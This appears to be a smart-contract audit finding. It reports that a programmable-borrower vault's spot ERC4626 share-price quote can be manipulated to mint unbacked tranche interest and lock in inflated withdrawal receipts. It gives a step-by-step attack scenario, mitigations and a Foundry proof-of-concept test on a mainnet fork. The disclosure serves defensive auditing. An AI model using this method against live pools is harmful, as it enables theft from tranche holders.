### Title
Programmable-borrower vault share price can be manipulated to mint unbacked tranche value - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` values its ERC4626 position with the vault’s instantaneous `convertToAssets` quote and feeds that value into `totalInterestDueNow`. A vault user who can temporarily inflate or deflate that quote can distort `stopEpoch` accounting, causing `IdleCDOEpochVariant` to mint or omit strategy-token interest. An attacker holding tranche tokens can crystallize an inflated tranche price into a fixed withdrawal receipt that is later paid from real pool liquidity. [1](#0-0) 

### Finding Description
The credit vault treats the programmable borrower’s ERC4626 position as part of its epoch PnL. `_currentVaultAssets` calls `vault.convertToAssets(shares)`, a spot valuation controlled by the configured external vault. [1](#0-0) 

`_vaultNetInterest` compares that spot valuation, plus withdrawals made during the epoch, with the epoch-start principal baseline. [2](#0-1) 

`totalInterestDueNow` exposes the resulting positive vault delta as pool-facing interest. [3](#0-2) 

During `stopEpoch`, the CDO uses this resolved interest as `_grossInterest`; in minted-interest mode it calls `mintStrategyTokens(_grossInterest)` and then runs `_updateAccounting`, raising tranche NAV and price. [4](#0-3) 

After the epoch stops, withdrawal requests reopen. `requestWithdraw` values the attacker’s tranche tokens using `_tranchePrice`, which was just raised by the manipulated quote, and `IdleCreditVault.requestWithdraw` mints a fixed-denomination receipt to the attacker. [5](#0-4) [6](#0-5) 

The receipt remains payable even after the ERC4626 quote returns to normal. When it is claimed, `_claimFundedWithdrawRequest` transfers the recorded amount rather than repricing the claim. [7](#0-6) 

### Impact Explanation
This can convert a temporary ERC4626 share-price inflation into unbacked strategy-token interest and then into a fixed withdrawal receipt.

Example with 10,000 units of active tranche NAV and a 10% attacker tranche position:

1. Attacker temporarily raises the ERC4626 share price so `convertToAssets` reports 1,000 excess units.
2. `totalInterestDueNow` reports 1,000 units of vault interest.
3. `stopEpoch` mints 1,000 strategy-token units and raises aggregate tranche NAV to 11,000.
4. Attacker requests withdrawal at the inflated price and receives receipts worth approximately 1,100 units instead of 1,000.
5. When the ERC4626 quote normalizes, the extra 100 units are borne by remaining tranche holders or make the pool insolvent.

The broken invariant is fair mint/burn: a receipt is created from an inflated valuation and later paid at par without rechecking the realizable value of the vault position. [8](#0-7) 

### Likelihood Explanation
Likelihood depends on the configured ERC4626 vault’s valuation and liquidity mechanics. The code does not bound, smooth, sanity-check, or require realization of `convertToAssets`; it directly consumes the spot quote in epoch accounting. [1](#0-0) 

The attack requires:

- programmable-borrower mode;
- a running epoch followed by an honest `stopEpoch` call;
- minted-interest accounting, where inflated interest is minted without an equivalent cash transfer;
- an attacker who already holds tranche tokens;
- a temporary increase in the configured vault’s `convertToAssets` quote.

The existing donated-asset skim does not mitigate this because the manipulated assets are not raw underlying held by the CDO; the inflation enters through the external vault share valuation. [9](#0-8) 

### Recommendation
Do not use an instantaneous ERC4626 `convertToAssets` quote directly for epoch PnL.

Recommended controls:

- Value the position with a manipulation-resistant vault NAV oracle or TWAP-style quote.
- Bound vault PnL per epoch with a configurable max deviation.
- Compare `convertToAssets` with realizable withdrawal liquidity before crediting interest.
- At minimum, treat positive vault PnL as unrealized until shares are redeemed or independently validated.
- Revert `stopEpoch` when the vault quote differs from a trusted reference by more than a configured threshold.
- If supporting arbitrary ERC4626 vaults, only permit vaults whose share price cannot be materially influenced by ordinary deposits, withdrawals, donations, or reserve manipulation.

### Proof of Concept
A reproducible Foundry test should deploy or fork the configured programmable-borrower ERC4626 vault, introduce a temporary share-price inflation before `stopEpoch`, and show that the resulting withdrawal receipt remains payable after the quote normalizes.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "../contracts/interfaces/IERC20Detailed.sol";
import {IdleCDOEpochVariant} from "../contracts/IdleCDOEpochVariant.sol";
import {IdleCDOTranche} from "../contracts/IdleCDOTranche.sol";
import {IdleCreditVault} from "../contracts/strategies/idle/IdleCreditVault.sol";
import {IProgrammableBorrower} from "../contracts/interfaces/IProgrammableBorrower.sol";

interface IManipulatableVault {
    function setSpotAssets(uint256 assets) external;
}

contract ProgrammableBorrowerSpotPriceManipulationTest is Test {
    uint256 internal constant ONE = 1e18;

    function testInflatedVaultQuoteCreatesFixedReceipt() internal {
        // Mainnet-fork configuration:
        // - underlying: production pool token
        // - cdo: production IdleCDOEpochVariant
        // - creditVault: production IdleCreditVault
        // - borrower: configured ProgrammableBorrower
        // - vault: configured ERC4626 vault used by ProgrammableBorrower

        IERC20Detailed underlying = IERC20Detailed(vm.envAddress("UNDERLYING"));
        IdleCDOEpochVariant cdo = IdleCDOEpochVariant(vm.envAddress("CDO"));
        IdleCreditVault creditVault = IdleCreditVault(cdo.strategy());
        IProgrammableBorrower borrower = IProgrammableBorrower(creditVault.borrower());
        IManipulatableVault vault =
            IManipulatableVault(vm.envAddress("PROGRAMMABLE_VAULT"));
        address manager = creditVault.manager();
        address attacker = vm.envAddress("ATTACKER_TRANCHE_HOLDER");

        require(cdo.isProgrammableBorrower(), "not programmable");
        require(cdo.isEpochRunning(), "epoch not running");

        IdleCDOTranche tranche = IdleCDOTranche(cdo.AATranche());
        uint256 attackerShares = tranche.balanceOf(attacker);
        assertGt(attackerShares, 0);

        uint256 baselineInterest = borrower.totalInterestDueNow();
        uint256 baselinePrice = cdo.virtualPrice(address(tranche));

        // Fork-specific manipulation: raise the vault's spot asset quote without
        // permanently adding the corresponding backing.
        uint256 manipulatedQuote = baselineInterest + 1_000e6;
        vault.setSpotAssets(manipulatedQuote);

        assertEq(borrower.totalInterestDueNow(), manipulatedQuote);

        vm.warp(cdo.epochEndDate());
        vm.prank(manager);
        cdo.stopEpoch(0, 0);

        uint256 inflatedPrice = cdo.tranchePrice(address(tranche));
        assertGt(inflatedPrice, baselinePrice);

        // Quote normalizes after the inflated interest was crystallized.
        vault.setSpotAssets(baselineInterest);

        vm.prank(attacker);
        uint256 receipt = cdo.requestWithdraw(0, address(tranche));

        uint256 uninflatedReceipt =
            attackerShares * baselinePrice / ONE;

        assertGt(receipt, uninflatedReceipt);

        // After the next epoch is funded normally, the receipt still pays the
        // recorded inflated amount instead of repricing against restored NAV.
        vm.prank(attacker);
        cdo.claimWithdrawRequest();

        assertEq(underlying.balanceOf(attacker), receipt);
    }
}
```

The important assertion is that `receipt` is computed from the manipulated `tranchePrice` but remains fixed after the external ERC4626 quote is restored. [7](#0-6)
